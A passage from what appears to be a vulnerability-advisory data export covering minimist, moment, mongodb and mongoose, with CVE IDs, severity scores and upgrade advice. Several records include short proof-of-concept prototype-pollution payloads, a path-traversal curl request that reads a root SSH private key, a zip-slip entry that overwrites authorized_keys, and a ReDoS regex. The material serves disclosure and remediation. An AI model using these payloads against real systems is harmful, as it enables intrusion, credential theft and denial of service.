Commit](https://github.com/minimistjs/minimist/commit/c2b981977fa834b223b408cfb860f933c9811e4d)\n- [Vulnerable Code](https://github.com/minimistjs/minimist/blob/master/index.js#L69)\n",
        "created_at": "2022-03-18T13:02:08Z",
        "updated_at": "2024-03-11T09:54:01Z",
        "problems": [
          {
            "id": "CVE-2021-44906",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 0.2.4 to fix this vulnerability",
                "details": {
                  "upgrade_package": "0.2.4"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<0.2.4,>=1.2.0 <1.2.6"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "low",
            "score": 3.7,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P"
          }
        ],
        "effective_severity_level": "low",
        "slots": [
          {
            "disclosure_time": "2022-03-18T12:24:05Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-03-21T12:09:35Z",
            "references": [
              {
                "url": "https://github.com/minimistjs/minimist/commit/34e20b8461118608703d6485326abbb8e35e1703",
                "title": "Fix Commit"
              },
              {
                "url": "https://github.com/minimistjs/minimist/commit/c2b981977fa834b223b408cfb860f933c9811e4d",
                "title": "Fix Commit"
              },
              {
                "url": "https://github.com/minimistjs/minimist/blob/master/index.js%23L69",
                "title": "Vulnerable Code"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-MINIMIST-559764",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[minimist](https://www.npmjs.com/package/minimist) is a parse argument options module.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The library could be tricked into adding or modifying properties of `Object.prototype` using a `constructor` or `__proto__` payload.\r\n\r\n## PoC by Snyk\r\n```\r\nrequire('minimist')('--__proto__.injected0 value0'.split(' '));\r\nconsole.log(({}).injected0 === 'value0'); // true\r\n\r\nrequire('minimist')('--constructor.prototype.injected1 value1'.split(' '));\r\nconsole.log(({}).injected1 === 'value1'); // true\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `minimist` to version 0.2.1, 1.2.3 or higher.\n## References\n- [Command Injection PoC](https://gist.github.com/Kirill89/47feb345b09bf081317f08dd43403a8a)\n- [GitHub Fix Commit #1](https://github.com/substack/minimist/commit/63e7ed05aa4b1889ec2f3b196426db4500cbda94)\n- [GitHub Fix Commit #2](https://github.com/substack/minimist/commit/38a4d1caead72ef99e824bb420a2528eec03d9ab)\n- [Snyk Research Blog](https://snyk.io/blog/prototype-pollution-minimist/)\n",
        "created_at": "2020-03-11T08:25:47Z",
        "updated_at": "2024-03-11T09:53:54Z",
        "problems": [
          {
            "id": "CVE-2020-7598",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 0.2.1 to fix this vulnerability",
                "details": {
                  "upgrade_package": "0.2.1"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<0.2.1,>=1.0.0 <1.2.3"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.6,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2020-03-10T08:22:24Z",
            "exploit": "Proof of Concept",
            "publication_time": "2020-03-11T08:22:19Z",
            "references": [
              {
                "url": "https://gist.github.com/Kirill89/47feb345b09bf081317f08dd43403a8a",
                "title": "Command Injection PoC"
              },
              {
                "url": "https://github.com/substack/minimist/commit/63e7ed05aa4b1889ec2f3b196426db4500cbda94",
                "title": "GitHub Fix Commit #1"
              },
              {
                "url": "https://github.com/substack/minimist/commit/38a4d1caead72ef99e824bb420a2528eec03d9ab",
                "title": "GitHub Fix Commit #2"
              },
              {
                "url": "https://snyk.io/blog/prototype-pollution-minimist/",
                "title": "Snyk Research Blog"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-MOMENT-2440688",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Directory Traversal",
        "description": "## Overview\n[moment](https://www.npmjs.com/package/moment) is a lightweight JavaScript date library for parsing, validating, manipulating, and formatting dates.\n\nAffected versions of this package are vulnerable to Directory Traversal when a user provides a locale string which is directly used to switch moment locale.\n\n## Details\n\nA Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with \"dot-dot-slash (../)\" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.\n\nDirectory Traversal vulnerabilities can be generally divided into two types:\n\n- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.\n\n`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.\n\nIf an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.\n\n```\ncurl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa\n```\n**Note** `%2e` is the URL encoded version of `.` (dot).\n\n- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. \n\nOne way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\n\nThe following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\n\n```\n2018-04-15 22:04:29 .....           19           19  good.txt\n2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys\n```\n\n## Remediation\nUpgrade `moment` to version 2.29.2 or higher.\n## References\n- [GitHub Commit](https://github.com/moment/moment/commit/4211bfc8f15746be4019bba557e29a7ba83d54c5)\n",
        "created_at": "2022-04-05T08:46:07Z",
        "updated_at": "2024-03-11T09:53:59Z",
        "problems": [
          {
            "id": "CVE-2022-24785",
            "source": "CVE"
          },
          {
            "id": "CWE-22",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 2.29.2 to fix this vulnerability",
                "details": {
                  "upgrade_package": "2.29.2"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<2.29.2"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2022-04-05T08:39:23Z",
            "exploit": "Not Defined",
            "publication_time": "2022-04-05T12:30:50Z",
            "references": [
              {
                "url": "https://github.com/moment/moment/commit/4211bfc8f15746be4019bba557e29a7ba83d54c5",
                "title": "GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-MONGODB-473855",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Denial of Service (DoS)",
        "description": "## Overview\n[mongodb](https://www.npmjs.com/package/mongodb) is an official MongoDB driver for Node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). The package fails to properly catch an exception when a collection name is invalid and the DB does not exist, crashing the application.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `mongodb` to version 3.1.13 or higher.\n## References\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1203)\n",
        "created_at": "2019-10-18T17:21:29Z",
        "updated_at": "2024-03-06T13:57:49Z",
        "problems": [
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.1.13 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.1.13"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<3.1.13"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2019-10-04T18:34:48Z",
            "exploit": "Not Defined",
            "publication_time": "2019-10-18T17:22:39Z",
            "references": [
              {
                "url": "https://www.npmjs.com/advisories/1203",
                "title": "NPM Security Advisory"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-MONGOOSE-1086688",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[mongoose](https://www.npmjs.com/package/mongoose) is a Mongoose is a MongoDB object modeling tool designed to work in an asynchronous environment.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The `mongoose.Schema()` function is subject to prototype pollution due to the recursively calling of `Schema.prototype.add()` function to add new items into the schema object. This vulnerability allows modification of the Object prototype.\r\n\r\n\r\n### PoC\r\n```\r\nmongoose = require('mongoose');\r\nmongoose.version; //'5.12.0'\r\nvar malicious_payload = '{\"__proto__\":{\"polluted\":\"HACKED\"}}';\r\nconsole.log('Before:', {}.polluted); // undefined\r\nmongoose.Schema(JSON.parse(malicious_payload));\r\nconsole.log('After:', {}.polluted); // HACKED\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `mongoose` to version 5.12.2 or higher.\n## References\n- [GitHub Commit](https://github.com/Automattic/mongoose/commit/3ed44ffa13737be9fc0d709980da9c3c552d54e7)\n- [GitHub Issue](https://github.com/Automattic/mongoose/issues/10035)\n",
        "created_at": "2021-03-18T13:23:51Z",
        "updated_at": "2024-03-06T13:59:58Z",
        "problems": [
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 5.12.2 to fix this vulnerability",
                "details": {
                  "upgrade_package": "5.12.2"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<5.12.2"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.6,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2021-03-18T13:23:15Z",
            "exploit": "Proof of Concept",
            "publication_time": "2021-03-24T15:13:10Z",
            "references": [
              {
                "url": "https://github.com/Automattic/mongoose/commit/3ed44ffa13737be9fc0d709980da9c3c552d54e7",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/Automattic/mongoose/issues/10035",
                "title": "GitHub Issue"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-MONGOOSE-2961688",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[mongoose](https://www.npmjs.com/package/mongoose) is a Mongoose is a MongoDB object modeling tool designed to work in an asynchronous environment.\n\nAffected versions of this package are vulnerable to Prototype Pollution in the `Schema.path()` function.\r\n\r\n**Note:**\r\nCVE-2022-24304 is a duplicate of CVE-2022-2564.\r\n\r\n\r\n## PoC:\r\n```js\r\nconst mongoose = require('mongoose');\r\nconst schema = new mongoose.Schema();\r\n\r\nmalicious_payload = '__proto__.toString'\r\n\r\nschema.path(malicious_payload, [String])\r\n\r\nx = {}\r\nconsole.log(x.toString())\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `mongoose` to version 5.13.15, 6.4.6 or higher.\n## References\n- [Github Commit](https://github.com/Automattic/mongoose/commit/6a197316564742c0422309e1b5fecfa4faec126e)\n- [GitHub Commit](https://github.com/Automattic/mongoose/commit/a45cfb6b0ce0067ae9794cfa80f7917e1fb3c6f8)\n- [GitHub Issue](https://github.com/Automattic/mongoose/issues/12085)\n",
        "created_at": "2022-07-28T13:54:38Z",
        "updated_at": "2024-03-11T09:49:51Z",
        "problems": [
          {
            "id": "CVE-2022-2564",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 5.13.15 to fix this vulnerability",
                "details": {
                  "upgrade_package": "5.13.15"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<5.13.15,>=6.0.0 <6.4.6"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2022-07-28T10:26:24Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-07-28T15:01:24Z",
            "references": [
              {
                "url": "https://github.com/Automattic/mongoose/commit/6a197316564742c0422309e1b5fecfa4faec126e",
                "title": "Github Commit"
              },
              {
                "url": "https://github.com/Automattic/mongoose/commit/a45cfb6b0ce0067ae9794cfa80f7917e1fb3c6f8",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/Automattic/mongoose/issues/12085",
                "title": "GitHub Issue"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-MONGOOSE-472486",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Information Exposure",
        "description": "## Overview\n[mongoose](https://www.npmjs.com/package/mongoose) is a Mongoose is a MongoDB object modeling tool designed to work in an asynchronous environment.\n\nAffected versions of this package are vulnerable to Information Exposure. Any query object with a `_bsontype` attribute is ignored, allowing attackers to bypass access control.\n## Remediation\nUpgrade `mongoose` to version 4.13.21, 5.7.5 or higher.\n## References\n- [GitHub Commit](https://github.com/Automattic/mongoose/commit/f3eca5b94d822225c04e96cbeed9f095afb3c31c)\n- [GitHub Issue](https://github.com/Automattic/mongoose/issues/8222)\n",
        "created_at": "2019-10-10T10:28:19Z",
        "updated_at": "2024-03-11T09:47:59Z",
        "problems": [
          {
            "id": "CVE-2019-17426",
            "source": "CVE"
          },
          {
            "id": "CWE-200",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 4.13.21 to fix this vulnerability",
                "details": {
                  "upgrade_package": "4.13.21"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<4.13.21,>=5.0.0 <5.7.5"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.9,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2019-07-10T01:52:12Z",
            "exploit": "Not Defined",
            "publication_time": "2019-10-10T10:31:41Z",
            "references": [
              {
                "url": "https://github.com/Automattic/mongoose/commit/f3eca5b94d822225c04e96cbeed9f095afb3c31c",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/Automattic/mongoose/issues/8222",
                "title": "GitHub Issue"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-MONGOOSE-5777721",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[mongoose](https://www.npmjs.com/package/mongoose) is a Mongoose is a MongoDB object modeling tool designed to work in an asynchronous environment.\n\nAffected versions of this package are vulnerable to Prototype Pollution in `document.js`, via update functions such as `findByIdAndUpdate()`. This allows attackers to achieve remote code execution.\r\n\r\n**Note:** Only applications using Express and EJS are vulnerable.\n## PoC\n```js\r\n\r\nimport { connect, model, Schema } from 'mongoose';\r\n\r\nawait connect('mongodb://127.0.0.1:27017/exploit');\r\n\r\nconst Example = model('Example', new Schema({ hello: String }));\r\n\r\nconst example = await new Example({ hello: 'world!' }).save();\r\nawait Example.findByIdAndUpdate(example._id, {\r\n    $rename: {\r\n        hello: '__proto__.polluted'\r\n    }\r\n});\r\n\r\n// this is what causes the pollution\r\nawait Example.find();\r\n\r\nconst test = {};\r\nconsole.log(test.polluted); // world!\r\nconsole.log(Object.prototype); // [Object: null prototype] { polluted: 'world!' }\r\n\r\nprocess.exit();\r\n\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript 